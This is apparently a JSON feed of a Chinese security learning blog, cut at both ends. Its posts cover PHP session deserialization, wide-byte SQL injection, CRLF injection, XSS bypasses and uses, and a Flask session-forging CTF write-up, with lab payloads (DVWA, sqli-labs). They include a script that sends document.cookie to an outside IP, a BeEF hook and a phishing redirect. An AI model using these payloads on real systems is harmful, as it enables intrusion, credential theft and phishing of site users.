eval($this-&gt;name);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$str = new f4ke();</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>test1.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">session_start();</span><br><span class=\"line\"></span><br><span class=\"line\">$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">echo $_SESSION[&#x27;session&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>首先在 test1.php 里构建 session:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?session=|O:4:&quot;f4ke&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<p>此时的 sess_PHPSESSID 文件内容:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a:1:&#123;s:7:&quot;session&quot;;s:45:&quot;|O:4:&quot;f4ke&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<p>浏览器保存的 PHPSESSID 文件名是不变的，当我们访问 test.php 时 (这个文件默认是 php 处理器), 根据上面的 session 原理流程图可知:</p>\n<ol>\n<li>获取 PHPSESSID</li>\n<li>初始化 <code>$_SESSION</code></li>\n<li>寻找 PHPSESSID 文件，<mark> 反序列化出数据</mark>放在 <code>$_SESSION</code>  中<br>\n注意此时反序列化的识别方式变成了 php 处理器的，而不是 php_serialize 的</li>\n</ol>\n<table s:4:name;s:10:phpinfo();;=\"\">\n<thead>\n<tr>\n<th style=\"text-align:center\">键名</th>\n<th style=\"text-align:center\">竖线</th>\n<th style=\"text-align:center\">经过 serialize () 函数反序列处理的值</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">a:1:{s:7:“session”;s:45:&quot;</td>\n<td style=\"text-align:center\">竖线</td>\n<td style=\"text-align:center\">O:4:“f4ke”:1:</td>\n</tr>\n</tbody>\n</table>\n<p>此时反序列化 <code>O:4:&quot;f4ke&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code> , 执行 phpinfo 方法<br>\n图片:<br>\n<img data-src=\"https://s2.loli.net/2023/07/01/1Cc8p6z5xNda3UW.png\" alt=\"屏幕截图 2023-07-01 003026.png\"></p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/06/29/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/",
            "url": "https://hq185187.github.io/2023/06/29/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/",
            "title": "宽字节注入学习",
            "date_published": "2023-06-29T10:06:07.947Z",
            "content_html": "<h3 id=\"先介绍几个函数\"><a class=\"markdownIt-Anchor\" href=\"#先介绍几个函数\">#</a> 先介绍几个函数</h3>\n<ol>\n<li>addslashes：在预定义字符（单引号，双引号，反斜杠，NULL）前加反斜杠</li>\n<li>mysql_real_escape_string：转义 SQL 语句中使用的字符串中的特殊字符 ( <code>\\x00,\\n,\\r,\\,',&quot;,\\x1a</code> )</li>\n</ol>\n<h3 id=\"原理\"><a class=\"markdownIt-Anchor\" href=\"#原理\">#</a> 原理</h3>\n<p>窄字节：字符大小为一个一个字节<br>\n宽字节：字符大小为两个字节<br>\n所有英文默认占一个字节，汉字占两个字节<br>\n常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS</p>\n<p>当数据库用 GBK 编码而 PHP 用 UTF-8 编码，当防止 SQL 注入的上面的函数发挥作用，在单双引号前加了反斜杠 <code>\\</code> 。假如我们在单双引号前加一个字符，使其和斜杠组合成一个汉字，从而保留单双引号，使其发挥作用。<br>\n注意：<br>\n添加的字符 ASCII 要大于 128，两个字符才能组合成汉字，因为前一个 ascii 码要大于 128，才到汉字的范围 ，这一点需要注意，经典的有 % df</p>\n<p>例子：Sqli-labs32 关<br>\n输入 1‘会被转义成 <code>1\\'</code> <br>\n 输入 1% df’%23 就可以成功回显<br>\n然后就是常规的字符型注入<br>\n爆表：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?id=-1%df&#x27; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure>\n<p>爆列名：（这里表名要用 16 进制）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1%df&#x27; union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273%23</span><br></pre></td></tr></table></figure>\n<p>爆字段：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1%df&#x27; union select 1,2,group_concat(username,0x7e,password)from users%23</span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/06/29/CRLF/",
            "url": "https://hq185187.github.io/2023/06/29/CRLF/",
            "title": "CRLF学习",
            "date_published": "2023-06-29T04:23:15.403Z",
            "content_html": "<p>CRLF 是回车＋换行（ <code>\\</code> r <code>\\</code> n）的简称，HTTP 的 Header 和 Body 是用两个 <code>\\</code> r <code>\\</code> n 分离的，可以利用它来构造 HTTP 数据包来完成注入（比如 Cookie），所以它又叫 HTTP Response Splitting</p>\n<h3 id=\"例子\"><a class=\"markdownIt-Anchor\" href=\"#例子\">#</a> 例子</h3>\n<p>比如一般网站 302 跳转的页面如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 302 Moved Temporarily </span><br><span class=\"line\">Date: Fri, 27 Jun 2014 17:52:17 GMT </span><br><span class=\"line\">Content-Type: text/html </span><br><span class=\"line\">Content-Length: 154 </span><br><span class=\"line\">Connection: close </span><br><span class=\"line\">Location: http://www.sina.com.cn</span><br></pre></td></tr></table></figure>\n<p>如果我们输入的是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sina.com.cn%0aSet-cookie:test</span><br></pre></td></tr></table></figure>\n<p>Location 下面就多了一个</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-cookie:test</span><br></pre></td></tr></table></figure>\n<p>我们也可以通过两个 CRLF（第一个来分离 HTTP 的头和体）来造成一个无视浏览器 filter 的反射型 xss</p>\n<p>浏览器的 filter 是在 url 中含有相关特征的 xss 代码时就会过滤掉不显示在页面上，可以通过设置 X-XSS-Protection:0 来关闭它</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?url=%0aX-XSS-Protection: 0%0a%0d%0a%0d&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"一款功能强大的crlf注入扫描工具\"><a class=\"markdownIt-Anchor\" href=\"#一款功能强大的crlf注入扫描工具\">#</a> 一款功能强大的 CRLF 注入扫描工具</h3>\n<p>CRLFsuite:<br>\n 地址：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git clone https://github.com/Nefcore/CRLFsuite.git</span><br><span class=\"line\"></span><br><span class=\"line\">$ cd CRLFsuite</span><br><span class=\"line\"></span><br><span class=\"line\">$ sudo python3 setup.py install</span><br><span class=\"line\"></span><br><span class=\"line\">$ crlfsuite -h</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93b295dW4uanMub3JnL2Ryb3BzL0NSTEYlMjBJbmplY3Rpb24lRTYlQkMlOEYlRTYlQjQlOUUlRTclOUElODQlRTUlODglQTklRTclOTQlQTglRTQlQjglOEUlRTUlQUUlOUUlRTQlQkUlOEIlRTUlODglODYlRTYlOUUlOTAuaHRtbA==\">参考</span></p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/06/27/XSS%E5%AD%A6%E4%B9%A02/",
            "url": "https://hq185187.github.io/2023/06/27/XSS%E5%AD%A6%E4%B9%A02/",
            "title": "XSS初学习2",
            "date_published": "2023-06-27T03:12:36.854Z",
            "content_html": "<h2 id=\"xss绕过\"><a class=\"markdownIt-Anchor\" href=\"#xss绕过\">#</a> XSS 绕过</h2>\n<h3 id=\"大小写绕过\"><a class=\"markdownIt-Anchor\" href=\"#大小写绕过\">#</a> 大小写绕过</h3>\n<p>html 对大小写不敏感</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;alert(&quot;123&quot;);&lt;/script&gt;</span><br><span class=\"line\">等价于</span><br><span class=\"line\">&lt;ScRipt&gt;ALERT(&quot;123&quot;);&lt;/scriPt&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"双写绕过\"><a class=\"markdownIt-Anchor\" href=\"#双写绕过\">#</a> 双写绕过</h3>\n<p>如果 replace 函数过滤了某个关键字，就可以尝试双写绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">假如过滤alert:</span><br><span class=\"line\">&lt;script&gt;alalertert(&quot;123&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"空格回车tab绕过\"><a class=\"markdownIt-Anchor\" href=\"#空格回车tab绕过\">#</a> 空格回车 TAB 绕过</h3>\n<p>js 解析到完整语句并且行尾存在换行符就可以省路分号，若解析确定不是完整语句，则会继续处理直到语句结束或出现分号<br>\n以</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=&quot;javascript:alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>为例:</p>\n<h4 id=\"空格绕过\"><a class=\"markdownIt-Anchor\" href=\"#空格绕过\">#</a> 空格绕过</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=&quot;java script:alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"回车绕过\"><a class=\"markdownIt-Anchor\" href=\"#回车绕过\">#</a> 回车绕过</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=&quot;java</span><br><span class=\"line\">script:</span><br><span class=\"line\">alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"tab绕过\"><a class=\"markdownIt-Anchor\" href=\"#tab绕过\">#</a> TAB 绕过</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=&quot;java    script:alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"注释绕过\"><a class=\"markdownIt-Anchor\" href=\"#注释绕过\">#</a> 注释绕过</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;alert(&quot;123&quot;);&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;scri&lt;!--1--&gt;pt&gt;alert(&quot;123&quot;);&lt;/sc&lt;!--1--&gt;ript&gt;</span><br></pre></td></tr></table></figure>\n<p>注意:<mark> 注释有两种方法表示</mark></p>\n<ol>\n<li><code>&lt;!--1--&gt;</code></li>\n<li>``&lt;!–1--!&gt;</li>\n</ol>\n<h3 id=\"编码绕过\"><a class=\"markdownIt-Anchor\" href=\"#编码绕过\">#</a> 编码绕过</h3>\n<h4 id=\"unicode编码绕过\"><a class=\"markdownIt-Anchor\" href=\"#unicode编码绕过\">#</a> unicode 编码绕过</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a href=&quot;javascript:alert(&#x27;&lt;\\u4e00&gt;&#x27;)&quot;&gt;test&lt;/a&gt;</span><br><span class=\"line\">\\u4e00是一的Unicode编码</span><br><span class=\"line\">等于</span><br><span class=\"line\">&lt;a href=&quot;javascript:alert(&#x27;&lt;一&gt;&#x27;)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"url编码绕过\"><a class=\"markdownIt-Anchor\" href=\"#url编码绕过\">#</a> url 编码绕过</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a href=&quot;javascript:%61%6C%65%72%74%28%22%78%73%73%22%29%3B;&quot;&gt;xss&lt;/a&gt;</span><br><span class=\"line\">等价于:</span><br><span class=\"line\">&lt;a href=&quot;javascript:alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"ascii码\"><a class=\"markdownIt-Anchor\" href=\"#ascii码\">#</a> ascii 码</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a href=&quot;javascript:alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br><span class=\"line\">等价</span><br><span class=\"line\">&lt;a href=&quot;javascript:97,108,101,114,116,40,34,120,115,115,34,41,59&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>\n<p>还有 hrml 实体编码绕过，base64 编码，十进制八进制绕过等等<br>\n过滤单双引号用反引号<code>``</code>替代</p>\n<p>更多的绕过看这篇<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUwODU0NzkwL2FydGljbGUvZGV0YWlscy8xMjQyOTcwNDY=\">绕过大全</span><br>\n关于编码绕过看<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zYXVjZXItbWFuLmNvbS9pbmZvcm1hdGlvbl9zZWN1cml0eS8xMDMuaHRtbA==\">这篇</span></p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/06/26/XSS%E5%AD%A6%E4%B9%A0/",
            "url": "https://hq185187.github.io/2023/06/26/XSS%E5%AD%A6%E4%B9%A0/",
            "title": "XSS初学习1",
            "date_published": "2023-06-26T11:55:23.905Z",
            "content_html": "<h2 id=\"xss介绍\"><a class=\"markdownIt-Anchor\" href=\"#xss介绍\">#</a> XSS 介绍</h2>\n<h3 id=\"xss简历\"><a class=\"markdownIt-Anchor\" href=\"#xss简历\">#</a> XSS 简历</h3>\n<p>XSS 攻击通常指利用网页开发时留下的漏洞，通过巧妙的方法注入恶意代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是 JavaScript，但实际上也可以包括 Java、 VBScript、ActiveX、 Flash 或者甚至是普通的 HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和 cookie 等各种内容。</p>\n<h3 id=\"xss原理\"><a class=\"markdownIt-Anchor\" href=\"#xss原理\">#</a> XSS 原理</h3>\n<p>程序对输入和输出的控制不够严格，导致构建的恶意代码输入后，在前端浏览的时候被当作有效的代码解析执行，从而产生危害</p>\n<h2 id=\"xss分类\"><a class=\"markdownIt-Anchor\" href=\"#xss分类\">#</a> XSS 分类</h2>\n<h3 id=\"反射型\"><a class=\"markdownIt-Anchor\" href=\"#反射型\">#</a> 反射型</h3>\n<p>将用户输入的内容作为代码让浏览器执行，一般需要引诱用户访问攻击者构造的 url，攻击发生在客户端，非持久型</p>\n<p>位置：用户登录入口，网站搜索框等</p>\n<p>案例：DVWA<br>\n<img data-src=\"https://s2.loli.net/2023/06/26/igRd3bOoJtVz5DY.png\" alt=\"屏幕截图 2023-06-26 105406.png\"></p>\n<h3 id=\"存储型\"><a class=\"markdownIt-Anchor\" href=\"#存储型\">#</a> 存储型</h3>\n<p>将攻击脚本永远嵌入一个页面中，用户访问时自己触发，这个恶意程序被保存在服务端数据库中，属于发生在客户端的攻击，是持久型的。</p>\n<p>案例：DVWA<br>\n 先弹一个 cookie，点击别的页面离开，再返回这个页面会自动弹 cookie<br>\n<img data-src=\"https://s2.loli.net/2023/06/26/TJC6ANsx5w3ySpO.png\" alt=\"屏幕截图 2023-06-26 111329.png\"></p>\n<h3 id=\"dom型\"><a class=\"markdownIt-Anchor\" href=\"#dom型\">#</a> DOM 型</h3>\n<p>DOM 全称 Document Object Model，是一个与平台，编程语言无关的接口，允许程序或者脚本动态地访问和更新文档内容，结构和样式，处理后的结果能够成为显示页面的一部分。由于 DOM 型 XSS 不与后台服务器产生数据交互，是一种通过 DOM 操作前端代码输出的时候产生的问题，大部分属于反射型<br>\n案例：DVWA<br>\nDOM 型不与服务端交互数据，完全的前端执行恶意代码，这里可以 select 一个语言，选 english 观察 url 有？default=english, 直接构造<br>\n<img data-src=\"https://s2.loli.net/2023/06/26/WaRwV9Cjf67LqZo.png\" alt=\"屏幕截图 2023-06-26 112550.png\"></p>\n<h2 id=\"常用攻击标签\"><a class=\"markdownIt-Anchor\" href=\"#常用攻击标签\">#</a> 常用攻击标签</h2>\n<h3 id=\"script\"><a class=\"markdownIt-Anchor\" href=\"#script\">#</a> script</h3>\n<p><code>&lt;scirpt&gt;alert(&quot;document.cookie&quot;);&lt;/script&gt;</code></p>\n<h3 id=\"img\"><a class=\"markdownIt-Anchor\" href=\"#img\">#</a> img</h3>\n<p>图片加载错误时触发</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=&quot;x&quot; onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<p>鼠标指针移动到元素时触发</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>鼠标指针移出时触发</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"a\"><a class=\"markdownIt-Anchor\" href=\"#a\">#</a> a</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a href=javascript:alert(&#x27;1&#x27;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"input\"><a class=\"markdownIt-Anchor\" href=\"#input\">#</a> input</h3>\n<p>按下按键时触发<br>\n示例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input type=&quot;text&quot; onkeydown=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">按下按键时触发</span><br><span class=\"line\">示例：&lt;input type=&quot;text&quot; onkeypress=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">松开按键式时触发</span><br><span class=\"line\">示例：&lt;input type=&quot;text&quot; onkeyup=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">竞争焦点，从而触发onblur事件</span><br><span class=\"line\"></span><br><span class=\"line\">示例：&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"style\"><a class=\"markdownIt-Anchor\" href=\"#style\">#</a> style</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;style οnlοad=alert(1)&gt;&lt;/style&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"应用\"><a class=\"markdownIt-Anchor\" href=\"#应用\">#</a> 应用</h2>\n<h3 id=\"获取cookie这里反射型为例\"><a class=\"markdownIt-Anchor\" href=\"#获取cookie这里反射型为例\">#</a> 获取 cookie:(这里反射型为例)</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">url?uname=&lt;script&gt;document.location=&quot;http://47.108.208.33/testxss/cookie.php?cookie=&quot;+document.cookie;&lt;/script&gt;</span><br><span class=\"line\">document.location是重定向的意思</span><br><span class=\"line\"></span><br><span class=\"line\">vps的cookie.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$cookie=$_GET[&#x27;cookie&#x27;];</span><br><span class=\"line\">file_put_contents(&#x27;cookie.txt&#x27;,$cookie);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>输入恶意连接会跳转到那个 url, 并将 cookie 写进 cookie.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;alert(document.cookie);&lt;/script&gt;</span><br><span class=\"line\">script标签之中可以输入任意js代码,rg</span><br><span class=\"line\">&lt;script&gt;console.log(&#x27;hacker&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"篡改恶意网页链接以反射性为例\"><a class=\"markdownIt-Anchor\" href=\"#篡改恶意网页链接以反射性为例\">#</a> 篡改恶意网页链接 (以反射性为例)</h3>\n<p>window.onload: 当窗口加载时，执行匿名函数</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\"><span class=\"variable language_\">window</span>.<span class=\"property\">onload</span>=<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\"><span class=\"keyword\">var</span> link=<span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementsByTagName</span>(<span class=\"string\">&quot;a&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">for</span>(j=<span class=\"number\">0</span>;j&lt;link.<span class=\"property\">length</span>;j++)&#123;</span><br><span class=\"line\">link[j].<span class=\"property\">href</span>=<span class=\"string\">&quot;http://attacker-site.com/&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"beef指向恶意链接\"><a class=\"markdownIt-Anchor\" href=\"#beef指向恶意链接\">#</a> beef 指向恶意链接</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">beef -xss</span><br><span class=\"line\">在存在xss的地方输入：</span><br><span class=\"line\">&lt;script src=&quot;http://192.168.240.122:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">在beef可以看到目标上线</span><br></pre></td></tr></table></figure>\n<p>比如我这里用 kali 开启 beef-xss，Windows 主机开 DVWA，在 kali 主机登录 DVWA 在存储型 xss 插入 hook，Windows 主机登录 DVWA 浏览 xss（stored），可以看到 beef 中已经获取了 Windows 的浏览器的信息<br>\n<img data-src=\"https://s2.loli.net/2023/06/26/HBaDmdNzP465FLJ.png\" alt=\"屏幕截图 2023-06-26 193218.png\"><br>\n<img data-src=\"https://s2.loli.net/2023/06/26/E17AdK3IcD2UFWR.png\" alt=\"屏幕截图 2023-06-26 193222.png\"><br>\n<img data-src=\"https://s2.loli.net/2023/06/26/ezNSPEUfZtKXj3r.png\" alt=\"屏幕截图 2023-06-26 193635.png\"></p>\n<h3 id=\"盗取用户信息\"><a class=\"markdownIt-Anchor\" href=\"#盗取用户信息\">#</a> 盗取用户信息</h3>\n<p>setoolkit 工具克隆钓鱼网站<br>\n xss payload:(以存储型为例)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;window.location=&quot;ip&quot;&lt;/script&gt;</span><br><span class=\"line\">这里的IP是用setoolkit伪造的页面的IP,我这里是</span><br><span class=\"line\">&lt;script&gt;window.location=&quot;http://192.168.206.123/&quot;&lt;/script&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>只要用户访问 kali 攻击机的地址就能看到伪造页面，此时用户的输入都被 kali 监听到</p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/06/23/NSS%20Round13/",
            "url": "https://hq185187.github.io/2023/06/23/NSS%20Round13/",
            "title": "NSS Round 13",
            "date_published": "2023-06-23T12:40:27.963Z",
            "content_html": "<h2 id=\"1flaskjwt\"><a class=\"markdownIt-Anchor\" href=\"#1flaskjwt\">#</a> 1.flask?jwt?</h2>\n<p>根据题目提示可以猜出这是 flask session 伪造问题<br>\n在忘记密码的页面源代码发现 key</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- secretkey: th3f1askisfunny --&gt;</span><br></pre></td></tr></table></figure>\n<p>经过简单的 fuzz 可以知道:</p>\n<ol>\n<li>admin 已经被注册</li>\n<li>只有 admin 可以拿 flag<br>\n 抓普通用户点击拿 flag 的时候的包，开始伪造 session:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python flask_session_cookie_manager3.py decode -c &#x27;你的session&#x27; -s &#x27;th3f1askisfunny&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">可以看此时的_user_id是2,admin应该是1,改成1加密</span><br><span class=\"line\"></span><br><span 